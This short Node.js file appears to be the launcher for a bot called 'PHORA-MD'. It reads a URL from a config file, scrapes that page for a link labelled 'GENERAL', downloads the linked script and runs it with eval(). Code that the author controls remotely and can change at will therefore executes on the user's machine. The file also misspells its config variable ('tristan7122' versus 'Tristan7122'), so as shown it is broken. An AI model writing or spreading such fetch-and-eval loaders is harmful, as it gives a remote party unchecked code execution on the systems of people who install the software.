//  [PHORA-MD]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Tristan                                  
//  >> Version: 1.0.0

const axios = require('axios');
const cheerio = require('cheerio');
const tristan7122 = require(__dirname + "/../config");

async function fetchGENERALUrl() {
  try {
    const response = await axios.get(Tristan7122.PHORA_MD);
    const $ = cheerio.load(response.data);

    const targetElement = $('a:contains("GENERAL")');
    const targetUrl = targetElement.attr('href');

    if (!targetUrl) {
      throw new Error('GENERAL not found 😭');
    }

    console.log('GENERAL loaded successfully ✅');

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchGENERALUrl();
